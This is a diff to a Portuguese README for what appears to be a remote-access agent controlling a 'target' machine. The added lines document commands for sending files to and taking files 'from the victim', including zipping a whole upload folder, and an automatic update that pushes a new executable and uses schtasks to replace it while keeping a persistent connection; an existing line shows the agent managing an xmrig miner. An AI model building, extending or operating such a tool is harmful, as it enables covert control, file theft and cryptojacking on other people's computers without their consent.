@@ -123,6 +123,16 @@ No `SystemClient.py`, conecte-se ao IP da máquina alvo.
 | **STOP:<pid>** | Para processo por ID. (Cuidado com "zumbis"). |
 | **STOPNAME:<name>**| **Kill All**. Mata todos com esse nome (`STOPNAME:xmrig`). |
 | **LIST** | Lista processos gerenciados pelo agente. |
+| **PUT <file>** | Envia arquivo para `C:\Windows\SystemOut\UPLOAD`. |
+| **GET <file>** | Baixa arquivo da vítima. |
+| **GET UPLOAD** | Baixa **toda a pasta UPLOAD** zipada (`UPLOAD.zip`). |
+
+### 🔄 Atualização Automática (Novo)
+
+O Cliente possui uma função nativa (**Opção 5**) para atualizar o agente remotamente sem perder a conexão persistente.
+1. Coloque o novo `SystemOutCache.exe` na pasta do seu Cliente.
+2. Selecione a **Opção 5** no menu.
+3. O sistema enviará o executável e agendará uma tarefa (`schtasks`) para trocar o binário e reiniciar o serviço automaticamente.
 
 ## 📂 Estrutura de Arquivos
 
